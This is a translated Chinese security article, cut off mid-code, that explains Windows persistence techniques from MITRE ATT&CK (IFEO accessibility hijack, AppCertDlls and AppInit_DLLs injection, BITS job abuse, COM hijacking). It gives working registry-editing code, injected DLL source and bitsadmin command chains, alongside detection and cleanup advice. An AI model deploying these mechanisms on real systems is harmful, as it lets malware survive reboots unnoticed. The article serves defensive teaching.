# ATT&CK之后门持久化
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
在网络安全的世界里，白帽子与黑帽子之间无时无刻都在进行着正与邪的对抗，似乎永无休止。正所谓，道高一尺魔高一丈，巨大的利益驱使着个人或组织利用技术进行不法行为，花样层出不穷，令人防不胜防。
为了更好的应对这些攻击手段，就需要做到了解对手。俗话说：知己知彼，方能百战不殆。MITRE
ATT&CK™就提供了全球范围的黑客的攻击手段和技术知识点，并把APT组织或恶意工具使用到的攻击手段一一对应，便于从根源上解决问题。许多公司和政府部门都会从中提取信息，针对遇到的威胁建立安全体系或模型。我们作为安全从业人员，如果能够掌握MITRE
ATT&CK™如此庞大的知识体系，对以后的工作和对抗来说，就像是拥有了一个武器库，所向披靡。
当然，这么一个庞大的体系是不可能一蹴而就的。我们可以依照MITRE
ATT&CK™的框架，先从持久化这一点开始。本文的主要内容是介绍APT攻击者在Windows系统下持久运行恶意代码的常用手段，其中的原理是什么，是怎样实现的，我们应该从哪些方面预防和检测。希望对大家有所帮助！
本文测试环境：
测试系统：Windows 7
编译器：Visual Stuidio 2008
以下是本文按照MITRE
ATTACK框架介绍的例子和其对应的介绍，我们深入分析了实现的原理，并且通过原理开发了相应的利用工具进行测试，测试呈现出的效果也都在下文一一展现。
* * *
标题 | -简介- | 权限 | 链接  
---|---|---|---  
辅助功能镜像劫持 | 在注册表中创建一个辅助功能的注册表项，并根据镜像劫持的原理添加键值，实现系统在未登录状态下，通过快捷键运行自己的程序。 | 管理员 |
进程注入之AppCertDlls 注册表项 |
编写了一个dll，创建一个AppCertDlls注册表项，在默认键值中添加dll的路径，实现了对使用特定API进程的注入。 | 管理员 |
进程注入之AppInit_DLLs注册表项 |
在某个注册表项中修改AppInit_DLLs和LoadAppInit_DLLs键值，实现对加载user32.dll进程的注入。 | 管理员 |
BITS 的灵活应用 | 通过bitsadmin命令加入传输任务，利用BITS的特性，实现每次重启都会执行自己的程序。 | 用户 |
Com组件劫持 | 编写了一个dll，放入特定的路径，在注册表项中修改默认和 ThreadingModel键值，实现打开计算器就会运行程序。 | 用户 |
DLL劫持 | 编写了一个lpk.dll，根据Windows的搜索模式放在指定目录中，修改注册表项，实现了开机启动执行dll。 | 用户 |
Winlogon helper | 编写了一个dll，里面有一个导出函数，修改注册表项，实现用户登录时执行导出函数。 | 管理员 |
篡改服务进程 | 编写一个服务进程，修改服务的注册表项，实现了开机启动自己的服务进程。 | 管理员 |
替换屏幕保护程序 | 修改注册表项，写入程序路径，实现在触发屏保程序运行时我们的程序被执行 | 用户 |
创建新服务 | 编写具有添加服务和修改注册表功能的程序以及有一定格式的dll，实现服务在后台稳定运行。 | 管理员 |
启动项 | 根据Startup目录和注册表Run键，创建快捷方式和修改注册表，实现开机自启动 | 用户 |
WMI事件过滤 | 用WMIC工具注册WMI事件，实现开机120秒后触发设定的命令 | 管理员 |
Netsh Helper DLL | 编写了一个netsh helper dll，通过netsh命令加入了 helper 列表，并将netsh
加入了计划任务，实现开机执行DLL | 管理员 |   
#  辅助功能镜像劫持
###  代码及原理介绍
为了使电脑更易于使用和访问，Windows添加了一些辅助功能。这些功能可以在用户登录之前以组合键启动。根据这个特征，一些恶意软件无需登录到系统，通过远程桌面协议就可以执行恶意代码。
一些常见的辅助功能如：
C:WindowsSystem32sethc.exe 粘滞键 快捷键：按五次shift键
C:WindowsSystem32utilman.exe 设置中心 快捷键：Windows+U键
下图就是在未登陆时弹出的设置中心
在较早的Windows版本，只需要进行简单的二进制文件替换，比如，程序”
C:WindowsSystem32utilman.exe”可以替换为“cmd.exe”。
对于在Windows Vista和Windows Server
2008及更高的版本中，替换的二进制文件受到了系统的保护，因此这里就需要另一项技术：映像劫持。
映像劫持，也被称为“IFEO”（Image File Execution
Options）。当目标程序被映像劫持时，双击目标程序，系统会转而运行劫持程序，并不会运行目标程序。许多病毒会利用这一点来抑制杀毒软件的运行，并运行自己的程序。
造成映像劫持的罪魁祸首就是参数“Debugger”，它是IFEO里第一个被处理的参数，系统如果发现某个程序文件在IFEO列表中，它就会首先来读取Debugger参数，如果该参数不为空，系统则会把Debugger参数里指定的程序文件名作为用户试图启动的程序执行请求来处理，而仅仅把用户试图启动的程序作为Debugger参数里指定的程序文件名的参数发送过去。
参数“Debugger”本来是为了让程序员能够通过双击程序文件直接进入调试器里调试自己的程序。现在却成了病毒的攻击手段。
简单操作就是修改注册表，在“HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage
File Execution Option”中添加utilman.exe项，在此项中添加debugger键，键值为要启动的程序路径。
实现代码：
    HKEY hKey;
    const char path[] = “C:hello.exe”;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,”SoftwareMicrosoftWindowsNTCurrentVersionImage File Execution OptionsUtilman.exe”, 0,NULL, 0, KEY_WRITE, NULL, &hKey,&dwDisposition);
    RegSetValueExA(hKey, “Debugger”, 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path)))
当然，我们自己的程序要放到相应的路径，关于资源文件的释放，下文会提到，这里暂且按下不讲。
###  运行效果图
当重新回到登录界面，按下快捷键时，结果如图：
注册表键值情况如下图：
###  检查及清除方法
检查“HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File
Execution Option”注册表路径中的程序名称
其它适用于的辅助功能还有：
屏幕键盘：C:WindowsSystem32osk.exe
放大镜：C:WindowsSystem32Magnify.exe
旁白：C:WindowsSystem32Narrator.exe
显示开关：C:WindowsSystem32DisplaySwitch.exe
应用程序开关：C:WindowsSystem32AtBroker.exe
现在大部分的杀毒软件都会监视注册表项来防御这种恶意行为。
## 进程注入之AppCertDlls 注册表项
###  代码及原理介绍
如果有进程使用了CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW或WinExec
函数，那么此进程会获取HKEY_LOCAL_MACHINESystemCurrentControlSetControlSessionManagerAppCertDlls注册表项，此项下的dll都会加载到此进程。
Win7版本下没有“AppCertDlls”项，需自己创建。
代码如下：
    HKEY hKey;
    const char path[] = “C:dll.dll”;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,”SYSTEMCurrentControlSetControlSession ManagerAppCertDlls”, 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition);
    RegSetValueExA(hKey, “Default”, 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path)));
Dll代码：
    BOOL TestMutex()
    {
    HANDLE hMutex = CreateMutexA(NULL, false, “myself”);
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
    CloseHandle(hMutex);
    return 0;
    }
    return 1;
    }
    BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
    {
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    if (TestMutex() == 0)
    return TRUE;
    MessageBoxA(0,”hello topsec”,”AppCert”,0);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
    break;
    }
    return TRUE;
    }
###  运行效果图
修改完注册表之后，写个测试小程序，用CreateProcess打开notepad.exe
可以看到test.exe中已经加载dll.dll，并弹出“hello
topsec”。也能发现，在svchost.exe和taskeng.exe中也加载了dll.dll。
###  检查及清除方法
监测dll的加载，特别是查找不是通常的dll，或者不是正常加载的dll。
监视AppCertDLL注册表值
监视和分析注册表编辑的API调用，如RegCreateKeyEx和RegSetValueEx。
## 进程注入之AppInit_DLLs注册表项
###  代码及原理介绍
User32.dll被加载到进程时，会获取AppInit_DLLs注册表项，若有值，则调用LoadLibrary()
API加载用户DLL。只会影响加载了user32.dll的进程。
HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsNTCurrentVersionWindowAppinit_Dlls
代码如下：
    HKEY hKey;
    DWORD dwDisposition;
    const char path[] = “C:AppInit.dll”;
    DWORD dwData = 1;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,”SOFTWAREMicrosoftWindows NTCurrentVersionWindows”, 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition);
    RegSetValueExA(hKey, “AppInit_DLLs”, 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path)));
    RegSetValueExA(hKey, “LoadAppInit_DLLs”, 0, REG_DWORD, (BYTE*)& dwData, sizeof(DWORD));
###  运行效果图
修改过后如下图所示：
运行cmd.exe，就会发现cmd.exe已经加载指定dll，并弹框。
此注册表项下的每个库都会加载到每个加载User32.dll的进程中。User32.dll是一个非常常见的库，用于存储对话框等图形元素。恶意软件可以在Appinit_Dlls注册表项下插入其恶意库的位置，以使另一个进程加载其库。因此，当恶意软件修改此子键时，大多数进程将加载恶意库。
###  检查及清除方法
监测加载User32.dll的进程的dll的加载，特别是查找不是通常的dll，或者不是正常加载的dll。
监视AppInit_DLLs注册表值。
监视和分析注册表编辑的API调用，如RegCreateKeyEx和RegSetValueEx。
## BITS的灵活应用
###  代码及原理介绍
BITS，后台智能传输服务，是一个 Windows
组件，它可以利用空闲的带宽在前台或后台异步传输文件，例如，当应用程序使用80%的可用带宽时，BITS将只使用剩下的20%。不影响其他网络应用程序的传输速度，并支持在重新启动计算机或重新建立网络连接之后自动恢复文件传输。
通常来说，BITS会代表请求的应用程序异步完成传输，即应用程序请求BITS服务进行传输后，可以自由地去执行其他任务，乃至终止。只要网络已连接并且任务所有者已登录，则传输就会在后台进行。当任务所有者未登录时，BITS任务不会进行。
BITS采用队列管理文件传输。一个BITS会话是由一个应用程序创建一个任务而开始。一个任务就是一份容器，它有一个或多个要传输的文件。新创建的任务是空的，需要指定来源与目标URI来添加文件。下载任务可以包含任意多的文件，而上传任务中只能有一个文件。可以为各个文件设置属性。任务将继承创建它的应用程序的安全上下文。BITS提供API接口来控制任务。通过编程可以来启动、停止、暂停、继续任务以及查询状态。在启动一个任务前，必须先设置它相对于传输队列中其他任务的优先级。默认情况下，所有任务均为正常优先级，而任务可以被设置为高、低或前台优先级。BITS将优化后台传输被，根据可用的空闲网络带宽来增加或减少（抑制）传输速率。如果一个网络应用程序开始耗用更多带宽，BITS将限制其传输速率以保证用户的交互式体验，但前台优先级的任务除外。
BITS的调度采用分配给每个任务有限时间片的机制，一个任务被暂停时，另一个任务才有机会获得传输时机。较高优先级的任务将获得较多的时间片。BITS采用循环制处理相同优先级的任务，并防止大的传输任务阻塞小的传输任务。
常用于 Windows Update的安装更新。
BITSAdmin，BITS管理工具，是管理BITS任务的命令行工具。
常用命令：
列出所有任务：bitsadmin /list /allusers /verbose
删除某个任务：bitsadmin /cancel 
删除所有任务：bitsadmin /reset /allusers
完成任务：bitsadmin /complete 
完整配置任务命令如下：
    bitsadmin /create TopSec
    bitsadmin /addfile TopSec https://gss3.bdstatic.com/7Po3dSag_xI4khGkpoWK1HF6hhy/baike/w%3D268%3Bg%3D0/sign=860ac8bc858ba61edf
    eecf29790ff037/b3fb43166d224f4a179bbd650ef790529822d142.jpg C:TopSec.jpg
    bitsadmin.exe /SetNotifyCmdLine TopSec “%COMSPEC%” “cmd.exe /c bitsadmin.exe /complete ”TopSec” && start /B C:TopSec.jpg”
    bitsadmin /Resume TopSec
下载图片到指定文件夹，完成后直接打开图片。
如果图片可以打开，那么就说明可以打开任意二进制程序。而BITS又有可以中断后继续工作的特性，所以下面就是解决在系统重新启动后仍能自动运行的操作。
现在将完成参数“complete”去掉，为了节省时间，将下载的远程服务器文件换成本地文件。代码如下：
    void BitsJob()
    {
    char szSaveName[MAX_PATH] = "C:\bitshello.exe";
    if (FALSE == m_Bits)
    {
       // 释放资源
       BOOL bRet = FreeMyResource(IDR_MYRES22, "MYRES2", szSaveName);
       WinExec("bitsadmin /create TopSec", 0);
       WinExec("bitsadmin /addfile TopSec "C:\Windows\system32\cmd.exe" "C:\cmd.exe"", 0);
       WinExec("bitsadmin.exe /SetNotifyCmdLine TopSec "C:\Windows\system32\cmd.exe" "cmd.exe /c C:\bitshello.exe"", 0);
       WinExec("bitsadmin /Resume TopSec", 0);
       m_Bits = TRUE;
    }
    else
    {
       WinExec("bitsadmin /complete TopSec", 0);
       remove(szSaveName);
       m_Bits = FALSE;
    }
    UpdateData(FALSE);
    }
解除未完成状态，需要命令“bitsadmin /complete TopSec”。
###  运行效果图
运行之后，拷贝到C盘的cmd.exe没有出现，却依然弹出对话框。
查看BITS任务列表，发现任务依然存在
重启计算机，发现弹出对话框，BITS任务依然存在。
执行命令“bitsadmin /complete TopSec”，出现拷贝到C盘的程序cmd.exe,任务完成。
###  检查及清除方法
BITS服务的运行状态可以使用SC查询程序来监视（命令：sc query bits），任务列表由BITSAdmin来查询。
监控和分析由BITS生成的网络活动。
## Com组件劫持
## 代码及原理介绍
COM是Component Object Model
（组件对象模型）的缩写，COM组件由DLL和EXE形式发布的可执行代码所组成。每个COM组件都有一个CLSID，这个CLSID是注册的时候写进注册表的，可以把这个CLSID理解为这个组件最终可以实例化的子类的一个ID。这样就可以通过查询注册表中的CLSID来找到COM组件所在的dll的名称。
所以要想COM劫持，必须精心挑选CLSID，尽量选择应用范围广的CLSID。这里，我们选择的CLSID为：{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}，来实现对
CAccPropServicesClass 和 MMDeviceEnumerator 的劫持。系统很多正常程序启动时需要调用这两个实例。例如计算器。
Dll存放的位置：//%APPDATA%Microsoft/Installer/{BCDE0395-E52F-467C-8E3D-C4579291692E}
接下来就是修改注册表，在指定路径添加文件，具体代码如下：
    void CPersistenceDlg::comHijacking()
    {
    HKEY hKey;
    DWORD dwDisposition;
    //%APPDATA%Microsoft/Installer/{BCDE0395-E52F-467C-8E3D-C45792916//92E}
    char system1[] = "C:\Users\TopSec\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\TopSec.dll";
    char system2[] = "Apartment";
    string defaultPath = "C:\Users\TopSec\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}";
    string szSaveName = "C:\Users\TopSec\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\TopSec.dll";
    if (FALSE == m_Com)
    {
       //string folderPath = defaultPath + "\testFolder";
       string command;
       command = "mkdir -p " + defaultPath;
       system(command.c_str());
       // 释放资源
       BOOL bRet = FreeMyResource(IDR_MYRES23, "MYRES2", system1);
       if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
           "Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
       {
           ShowError("RegCreateKeyExA");
           return;
       }
       if (ERROR_SUCCESS != RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)system1, (1 + ::lstrlenA(system1))))
       {
           ShowError("RegSetValueEx");
           return;
       }
       if (ERROR_SUCCESS != RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)system2, (1 + ::lstrlenA(system2))))
       {
           ShowError("RegSetValueEx");
           return;
       }
       ::MessageBoxA(NULL, "comHijacking OK!", "OK", MB_OK);
       m_Com = TRUE;
    }
    else
    {
       if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
           "Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
       {
           ShowError("RegCreateKeyExA");
           return;
       }
       if (ERROR_SUCCESS != RegDeleteValueA(hKey, NULL))
       {
           ShowError("RegDeleteValueA");